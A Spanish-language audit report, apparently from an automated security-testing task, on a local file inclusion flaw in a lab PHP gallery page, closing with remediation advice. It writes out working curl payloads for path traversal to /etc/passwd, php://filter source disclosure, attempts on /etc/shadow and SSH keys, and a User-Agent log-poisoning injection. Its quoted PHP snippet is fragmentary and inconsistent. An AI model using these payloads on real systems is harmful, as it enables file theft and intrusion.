# Informe de auditoria LFI

- Objetivo: `http://web.dev.local:8081`
- Fecha base de la tarea: `2026-04-20T12:49:42`
- Vulnerabilidad confirmada: `Local File Inclusion (LFI)` en `gallery.php?page=`
- Explotacion confirmada: `Si`, mediante lectura de `/etc/passwd`

## Resumen ejecutivo

La aplicacion es vulnerable a inclusiones locales arbitrarias a traves del parametro GET `page` en `http://web.dev.local:8081/gallery.php?page=`. El flujo de la aplicacion intenta construir rutas bajo `pages/` solo cuando el valor no contiene punto (`.`), pero si el valor contiene una extension o traversal, usa el valor tal cual y ejecuta `include($file)`. Esto permite leer archivos locales y, con `php://filter`, revelar el codigo fuente PHP.

Se confirmo el impacto en dos niveles:

1. Lectura de archivos propios de la aplicacion, incluyendo el codigo fuente de `gallery.php` y `index.php`.
2. Lectura de archivos del sistema operativo, incluyendo `/etc/passwd`, lo que confirma explotacion real del LFI.

## Reconocimiento realizado

La pagina principal expone enlaces con el parametro dinamico `page`:

- `gallery.php?page=modern`
- `gallery.php?page=classic`
- `gallery.php?page=abstract`
- `gallery.php?page=about`

Cabeceras observadas:

- `Server: Apache/2.4.65 (Debian)`
- `X-Powered-By: PHP/8.1.33`

## Comandos utilizados

```bash
curl -sS -D /tmp/root_headers.txt -o /tmp/root.html http://web.dev.local:8081/
```

```bash
curl -sS 'http://web.dev.local:8081/gallery.php?page=../../../../../etc/passwd'
```

```bash
curl -sS 'http://web.dev.local:8081/gallery.php?page=php://filter/read=convert.base64-encode/resource=gallery.php'
```

```bash
curl -sS 'http://web.dev.local:8081/gallery.php?page=../../../../../var/www/html/index.php'
```

```bash
curl -sS 'http://web.dev.local:8081/gallery.php?page=../../../../../proc/self/environ'
```

```bash
curl -sS -A "<?php echo 'LFI_LOG_PWNED_20260420'; ?>" http://web.dev.local:8081/
curl -sS 'http://web.dev.local:8081/gallery.php?page=../../../../../var/log/apache2/access.log'
```

## Payloads probados y resultados

### Confirmacion de LFI

- Payload: `../../../../../var/www/html/index.php`
- Resultado: el contenido de `index.php` fue incluido dentro del HTML de `gallery.php`, confirmando inclusion local arbitraria.

- Payload: `php://filter/read=convert.base64-encode/resource=gallery.php`
- Resultado: se devolvio una cadena Base64 que, tras decodificacion, revelo el codigo fuente de `gallery.php`.

### Explotacion del sistema operativo

- Payload definitivo: `../../../../../etc/passwd`
- Resultado: lectura directa de `/etc/passwd` dentro de la respuesta HTTP.

Fragmento de evidencia:

```text
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
```

### Pruebas adicionales

- `../../../../../etc/shadow` -> `Permission denied`
- `../../../../../proc/self/environ` -> `Permission denied`, pero revelo path disclosure en `/var/www/html/gallery.php` linea `104`
- `../../../../../var/log/apache2/access.log` -> `No such file or directory`
- `../../../../../var/log/apache2/error.log` -> `No such file or directory`
- `../../../../../root/.ssh/id_rsa` -> sin lectura util

## Codigo vulnerable extraido

El wrapper `php://filter` permitio recuperar el codigo fuente. Fragmento relevante:

```php
$page = $_GET['page'] ?? 'modern';
            if (strpos($page, '.') !== false) {
                $file = $page;
                $file = "pages/" . $page . ".php";
            if (file_exists($file)) {
                include($file);
                @include($file);
```

Interpretacion:

- Si `page` contiene un punto (`.`), la aplicacion usa el valor recibido directamente como ruta.
- Despues ejecuta `include($file)`.
- Si `file_exists($file)` falla, igualmente intenta `@include($file)`, lo que amplia la superficie y permite wrappers como `php://filter`.

## Hallazgos tecnicos clave

1. **LFI directo por traversal**
   - URL vulnerable: `http://web.dev.local:8081/gallery.php?page=`
   - Parametro: `page`
   - Payload exitoso: `../../../../../etc/passwd`

2. **Lectura de codigo fuente via wrapper PHP**
   - Payload exitoso: `php://filter/read=convert.base64-encode/resource=gallery.php`
   - Impacto: disclosure del codigo fuente y comprension exacta de la logica vulnerable.

3. **Path disclosure adicional**
   - Evidencia: warnings con ruta absoluta `/var/www/html/gallery.php` y linea `104`.
   - Utilidad: facilita ajustar rutas relativas y optimizar payloads LFI.

## Impacto real

El impacto es **alto** porque un atacante autenticado o no autenticado (segun la exposicion de la ruta) puede:

- Leer archivos sensibles de la aplicacion.
- Obtener el codigo fuente PHP y revisar secretos hardcodeados, credenciales o logica de negocio.
- Leer archivos del sistema como `/etc/passwd`.
- Utilizar la revelacion de rutas para preparar tecnicas adicionales de escalada relacionadas con LFI.

Aunque en esta instancia no se logro leer `/etc/shadow` ni ejecutar RCE por log poisoning, la explotacion de LFI sobre el sistema operativo quedo confirmada.

## Conclusiones

- `VULN_FOUND = true`
- `VULN_EXPLOITED = true`

La vulnerabilidad se debe a una inclusion insegura de archivos controlada por el usuario en `gallery.php?page=`. La explotacion fue validada mediante lectura de archivos internos de la app y del archivo del sistema `/etc/passwd`.

## Recomendaciones de remediacion

- Eliminar el uso directo de `include()` con entradas del usuario.
- Implementar una lista blanca estricta de vistas permitidas (`modern`, `classic`, `abstract`, `about`).
- Resolver las vistas mediante mapeo interno fijo, no mediante rutas construidas desde input.
- Deshabilitar la exposicion de errores en produccion.
- Restringir wrappers peligrosos y revisar permisos del proceso web.
